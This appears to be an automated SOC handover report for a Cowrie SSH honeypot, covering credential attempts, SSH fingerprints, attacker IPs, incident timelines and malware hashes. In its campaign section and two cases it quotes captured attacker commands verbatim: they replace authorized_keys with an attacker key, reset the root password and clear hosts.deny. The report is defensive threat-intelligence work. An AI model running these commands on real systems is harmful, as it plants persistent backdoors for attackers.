# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-05 |
| **Generated At** | 2026-04-05T10:32:01Z |
| **Shift Time** | 10:32 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **47** |
| Confirmed Threats | **44** |
| False Positives Filtered | **3** (6.4%) |
| Unique Attacker IPs | **17** |
| Countries of Origin | **5** |
| High Severity Cases | **10** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **37** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **24** |
| Unique Credential Pairs | **23** |
| Unique Usernames | **14** |
| Unique Passwords | **21** |
| Successful Auth Pairs | **10** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 11 |
| `hduser` | 1 |
| `manuel` | 1 |
| `bot` | 1 |
| `ubuntu` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 3 |
| `sol` | 2 |
| `manuel` | 1 |
| `CCcc111` | 1 |
| `bot15` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `sol` | 2 |
| `hduser` | `admin` | 1 |
| `manuel` | `manuel` | 1 |
| `root` | `CCcc111` | 1 |
| `bot` | `bot15` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `CCcc111` | `119.96.82.192` | 2026-04-05T08:49:41 |
| `root` | `sol` | `52.237.143.50` | 2026-04-05T09:01:25 |
| `root` | `1234` | `128.24.161.194` | 2026-04-05T09:11:38 |
| `root` | `admin` | `52.237.143.50` | 2026-04-05T09:13:21 |
| `root` | `12345678` | `128.24.161.194` | 2026-04-05T09:20:52 |
| `root` | `P` | `101.96.202.176` | 2026-04-05T09:21:47 |
| `root` | `solana` | `128.24.161.194` | 2026-04-05T09:39:58 |
| `root` | `sol` | `128.24.161.194` | 2026-04-05T09:59:03 |
| `root` | `password.123` | `125.247.116.158` | 2026-04-05T10:30:08 |
| `root` | `3245gs5662d34` | `125.247.116.158` | 2026-04-05T10:30:12 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **47** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 31 |
| Go SSH scanner | 7 |
| OpenSSH | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 25 | 4 |
| `16443846184e...` | Generic scanner | 7 | 2 |
| `19532158b559...` | Mirai/variant | 3 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 2 | 2 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 25 | 4 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 7 | 2 | Generic scanner |
| `19532158b559...` | libssh | 3 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 2 | 2 | — |
| `acaa53e0a7d7...` | OpenSSH | 2 | 2 | Mirai/variant |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:65Di4bCo6GmZ"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `119.96.82.192`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `125.247.116.158`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **17** |
| Unique ASNs | **14** |
| High-Risk ASNs | **12** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS17421` | Mobile Business Group | 1 | HIGH |
| `AS22773` | Cox Communications Inc. | 1 | LOW |
| `AS63199` | CDS Global Cloud Co., Ltd | 1 | HIGH |
| `AS9316` | DACOM-PUBNETPLUS | 1 | HIGH |
| `AS27294` | Reserve Long Distance Company, Inc | 1 | HIGH |
| `AS6855` | Slovak Telekom, a.s. | 1 | HIGH |
| `AS58563` | CHINANET Hubei province network | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (10)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-da888358d93a

| Field | Detail |
|---|---|
| **Source IP** | `119.96.82[.]192` |
| **First Seen** | 2026-04-05 08:49 |
| **Last Seen** | 2026-04-05 08:50 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:65Di4bCo6GmZ"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 08:49:40` | `cowrie.session.connect` |
| `2026-04-05 08:49:40` | `cowrie.client.version` |
| `2026-04-05 08:49:40` | `cowrie.client.kex` |
| `2026-04-05 08:49:41` | `cowrie.login.success` |
| `2026-04-05 08:49:41` | `cowrie.session.params` |
| `2026-04-05 08:49:41` | `cowrie.command.input` |
| `2026-04-05 08:49:41` | `cowrie.command.failed` |
| `2026-04-05 08:49:41` | `cowrie.log.closed` |
| `2026-04-05 08:49:42` | `cowrie.session.params` |
| `2026-04-05 08:49:42` | `cowrie.command.input` |
| `2026-04-05 08:49:42` | `cowrie.session.file_download` |
| `2026-04-05 08:49:42` | `cowrie.log.closed` |
| `2026-04-05 08:49:55` | `cowrie.session.params` |
| `2026-04-05 08:49:55` | `cowrie.command.input` |
| `2026-04-05 08:49:55` | `cowrie.log.closed` |
| `2026-04-05 08:49:56` | `cowrie.session.params` |
| `2026-04-05 08:49:56` | `cowrie.command.input` |
| `2026-04-05 08:49:56` | `cowrie.log.closed` |
| `2026-04-05 08:49:56` | `cowrie.session.params` |
| `2026-04-05 08:49:56` | `cowrie.command.input` |
| `2026-04-05 08:49:56` | `cowrie.session.file_download` |
| `2026-04-05 08:49:56` | `cowrie.log.closed` |
| `2026-04-05 08:49:57` | `cowrie.session.params` |
| `2026-04-05 08:49:57` | `cowrie.command.input` |
| `2026-04-05 08:49:57` | `cowrie.log.closed` |
| `2026-04-05 08:49:57` | `cowrie.session.params` |
| `2026-04-05 08:49:57` | `cowrie.command.input` |
| `2026-04-05 08:49:57` | `cowrie.log.closed` |
| `2026-04-05 08:49:57` | `cowrie.session.params` |
| `2026-04-05 08:49:57` | `cowrie.command.input` |
| `2026-04-05 08:49:57` | `cowrie.command.input` |
| `2026-04-05 08:49:58` | `cowrie.log.closed` |
| `2026-04-05 08:49:58` | `cowrie.session.params` |
| `2026-04-05 08:49:58` | `cowrie.command.input` |
| `2026-04-05 08:49:58` | `cowrie.log.closed` |
| `2026-04-05 08:49:58` | `cowrie.session.params` |
| `2026-04-05 08:49:58` | `cowrie.command.input` |
| `2026-04-05 08:49:59` | `cowrie.log.closed` |
| `2026-04-05 08:49:59` | `cowrie.session.params` |
| `2026-04-05 08:49:59` | `cowrie.command.input` |
| `2026-04-05 08:49:59` | `cowrie.log.closed` |
| `2026-04-05 08:49:59` | `cowrie.session.params` |
| `2026-04-05 08:49:59` | `cowrie.command.input` |
| `2026-04-05 08:50:00` | `cowrie.log.closed` |
| `2026-04-05 08:50:00` | `cowrie.session.params` |
| `2026-04-05 08:50:00` | `cowrie.command.input` |
| `2026-04-05 08:50:00` | `cowrie.log.closed` |
| `2026-04-05 08:50:00` | `cowrie.session.params` |
| `2026-04-05 08:50:00` | `cowrie.command.input` |
| `2026-04-05 08:50:01` | `cowrie.log.closed` |
| `2026-04-05 08:50:01` | `cowrie.session.params` |
| `2026-04-05 08:50:01` | `cowrie.command.input` |
| `2026-04-05 08:50:01` | `cowrie.log.closed` |
| `2026-04-05 08:50:01` | `cowrie.session.params` |
| `2026-04-05 08:50:01` | `cowrie.command.input` |
| `2026-04-05 08:50:02` | `cowrie.log.closed` |
| `2026-04-05 08:50:02` | `cowrie.session.params` |
| `2026-04-05 08:50:02` | `cowrie.command.input` |
| `2026-04-05 08:50:02` | `cowrie.log.closed` |
| `2026-04-05 08:50:02` | `cowrie.session.params` |
| `2026-04-05 08:50:02` | `cowrie.command.input` |
| `2026-04-05 08:50:02` | `cowrie.log.closed` |
| `2026-04-05 08:50:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.96.82[.]192` to AbuseIPDB if not already reported
- [ ] Block `119.96.82[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df35149135a2

| Field | Detail |
|---|---|
| **Source IP** | `52.237.143[.]50` |
| **First Seen** | 2026-04-05 09:01 |
| **Last Seen** | 2026-04-05 09:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `nproc 2>/dev/null || (grep -c '^processor' /proc/cpuinfo 2>/dev/null) || echo 0, grep -c ^processor /proc/cpuinfo 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 09:01:24` | `cowrie.session.connect` |
| `2026-04-05 09:01:24` | `cowrie.client.version` |
| `2026-04-05 09:01:24` | `cowrie.client.kex` |
| `2026-04-05 09:01:25` | `cowrie.login.success` |
| `2026-04-05 09:01:26` | `cowrie.session.params` |
| `2026-04-05 09:01:26` | `cowrie.command.input` |
| `2026-04-05 09:01:26` | `cowrie.command.input` |
| `2026-04-05 09:01:26` | `cowrie.log.closed` |
| `2026-04-05 09:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.237.143[.]50` to AbuseIPDB if not already reported
- [ ] Block `52.237.143[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6af40763d7e

| Field | Detail |
|---|---|
| **Source IP** | `128.24.161[.]194` |
| **First Seen** | 2026-04-05 09:11 |
| **Last Seen** | 2026-04-05 09:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `whoami` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 09:11:36` | `cowrie.session.connect` |
| `2026-04-05 09:11:36` | `cowrie.client.version` |
| `2026-04-05 09:11:37` | `cowrie.client.kex` |
| `2026-04-05 09:11:38` | `cowrie.login.success` |
| `2026-04-05 09:11:39` | `cowrie.session.params` |
| `2026-04-05 09:11:39` | `cowrie.command.input` |
| `2026-04-05 09:11:39` | `cowrie.log.closed` |
| `2026-04-05 09:11:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.24.161[.]194` to AbuseIPDB if not already reported
- [ ] Block `128.24.161[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bde443ae34b8

| Field | Detail |
|---|---|
| **Source IP** | `52.237.143[.]50` |
| **First Seen** | 2026-04-05 09:13 |
| **Last Seen** | 2026-04-05 09:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 09:13:20` | `cowrie.session.connect` |
| `2026-04-05 09:13:20` | `cowrie.client.version` |
| `2026-04-05 09:13:20` | `cowrie.client.kex` |
| `2026-04-05 09:13:21` | `cowrie.login.success` |
| `2026-04-05 09:13:22` | `cowrie.session.params` |
| `2026-04-05 09:13:22` | `cowrie.command.input` |
| `2026-04-05 09:13:22` | `cowrie.log.closed` |
| `2026-04-05 09:13:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.237.143[.]50` to AbuseIPDB if not already reported
- [ ] Block `52.237.143[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0d3dc3df75f

| Field | Detail |
|---|---|
| **Source IP** | `128.24.161[.]194` |
| **First Seen** | 2026-04-05 09:20 |
| **Last Seen** | 2026-04-05 09:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ssh -V` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 09:20:51` | `cowrie.session.connect` |
| `2026-04-05 09:20:51` | `cowrie.client.version` |
| `2026-04-05 09:20:51` | `cowrie.client.kex` |
| `2026-04-05 09:20:52` | `cowrie.login.success` |
| `2026-04-05 09:20:52` | `cowrie.session.params` |
| `2026-04-05 09:20:52` | `cowrie.command.input` |
| `2026-04-05 09:20:52` | `cowrie.log.closed` |
| `2026-04-05 09:20:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.24.161[.]194` to AbuseIPDB if not already reported
- [ ] Block `128.24.161[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbef3dbe1250

| Field | Detail |
|---|---|
| **Source IP** | `101.96.202[.]176` |
| **First Seen** | 2026-04-05 09:21 |
| **Last Seen** | 2026-04-05 09:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 09:21:46` | `cowrie.session.connect` |
| `2026-04-05 09:21:46` | `cowrie.client.version` |
| `2026-04-05 09:21:47` | `cowrie.client.kex` |
| `2026-04-05 09:21:47` | `cowrie.login.success` |
| `2026-04-05 09:21:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.202[.]176` to AbuseIPDB if not already reported
- [ ] Block `101.96.202[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdb6d77a3939

| Field | Detail |
|---|---|
| **Source IP** | `128.24.161[.]194` |
| **First Seen** | 2026-04-05 09:39 |
| **Last Seen** | 2026-04-05 09:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ps aux | head -10` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 09:39:57` | `cowrie.session.connect` |
| `2026-04-05 09:39:57` | `cowrie.client.version` |
| `2026-04-05 09:39:57` | `cowrie.client.kex` |
| `2026-04-05 09:39:58` | `cowrie.login.success` |
| `2026-04-05 09:39:59` | `cowrie.session.params` |
| `2026-04-05 09:39:59` | `cowrie.command.input` |
| `2026-04-05 09:39:59` | `cowrie.log.closed` |
| `2026-04-05 09:39:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.24.161[.]194` to AbuseIPDB if not already reported
- [ ] Block `128.24.161[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f00478e241f9

| Field | Detail |
|---|---|
| **Source IP** | `128.24.161[.]194` |
| **First Seen** | 2026-04-05 09:59 |
| **Last Seen** | 2026-04-05 09:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 09:59:02` | `cowrie.session.connect` |
| `2026-04-05 09:59:02` | `cowrie.client.version` |
| `2026-04-05 09:59:02` | `cowrie.client.kex` |
| `2026-04-05 09:59:03` | `cowrie.login.success` |
| `2026-04-05 09:59:04` | `cowrie.session.params` |
| `2026-04-05 09:59:04` | `cowrie.command.input` |
| `2026-04-05 09:59:04` | `cowrie.log.closed` |
| `2026-04-05 09:59:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.24.161[.]194` to AbuseIPDB if not already reported
- [ ] Block `128.24.161[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d5ca1d3e72f

| Field | Detail |
|---|---|
| **Source IP** | `125.247.116[.]158` |
| **First Seen** | 2026-04-05 10:30 |
| **Last Seen** | 2026-04-05 10:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 10:30:07` | `cowrie.session.connect` |
| `2026-04-05 10:30:07` | `cowrie.client.version` |
| `2026-04-05 10:30:07` | `cowrie.client.kex` |
| `2026-04-05 10:30:08` | `cowrie.login.success` |
| `2026-04-05 10:30:08` | `cowrie.session.params` |
| `2026-04-05 10:30:08` | `cowrie.command.input` |
| `2026-04-05 10:30:08` | `cowrie.command.failed` |
| `2026-04-05 10:30:08` | `cowrie.log.closed` |
| `2026-04-05 10:30:09` | `cowrie.session.params` |
| `2026-04-05 10:30:09` | `cowrie.command.input` |
| `2026-04-05 10:30:09` | `cowrie.session.file_download` |
| `2026-04-05 10:30:09` | `cowrie.log.closed` |
| `2026-04-05 10:30:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.247.116[.]158` to AbuseIPDB if not already reported
- [ ] Block `125.247.116[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-438c247ed2b3

| Field | Detail |
|---|---|
| **Source IP** | `125.247.116[.]158` |
| **First Seen** | 2026-04-05 10:30 |
| **Last Seen** | 2026-04-05 10:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 10:30:11` | `cowrie.session.connect` |
| `2026-04-05 10:30:11` | `cowrie.client.version` |
| `2026-04-05 10:30:11` | `cowrie.client.kex` |
| `2026-04-05 10:30:12` | `cowrie.login.success` |
| `2026-04-05 10:30:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.247.116[.]158` to AbuseIPDB if not already reported
- [ ] Block `125.247.116[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `119.96.82[.]192` | **15** | 2026-04-05 08:46 | 2026-04-05 08:57 | 19m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `125.247.116[.]158` | **5** | 2026-04-05 09:29 | 2026-04-05 10:30 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `101.96.202[.]176` | **2** | 2026-04-05 09:20 | 2026-04-05 09:21 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.40.218[.]197` | **2** | 2026-04-05 09:08 | 2026-04-05 09:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.93.1[.]160` | **2** | 2026-04-05 08:42 | 2026-04-05 08:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `111.70.23[.]235` | 1 | 2026-04-05 09:35 | 2026-04-05 09:35 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.186.208[.]20` | 1 | 2026-04-05 08:41 | 2026-04-05 08:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.241.79[.]66` | 1 | 2026-04-05 10:21 | 2026-04-05 10:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.77[.]176` | 1 | 2026-04-05 09:34 | 2026-04-05 09:34 | 14s | 0 | `T1592` | 🟢 LOW |
| `148.153.188[.]246` | 1 | 2026-04-05 09:19 | 2026-04-05 09:19 | 15s | 0 | `T1592` | 🟢 LOW |
| `220.133.125[.]96` | 1 | 2026-04-05 10:14 | 2026-04-05 10:14 | 30s | 0 | `T1592` | 🟢 LOW |
| `64.251.101[.]143` | 1 | 2026-04-05 08:52 | 2026-04-05 08:52 | 13s | 0 | `T1592` | 🟢 LOW |
| `95.102.39[.]248` | 1 | 2026-04-05 09:16 | 2026-04-05 09:16 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 10/100 | 🟢 LOW | **26/76** 🔴 |
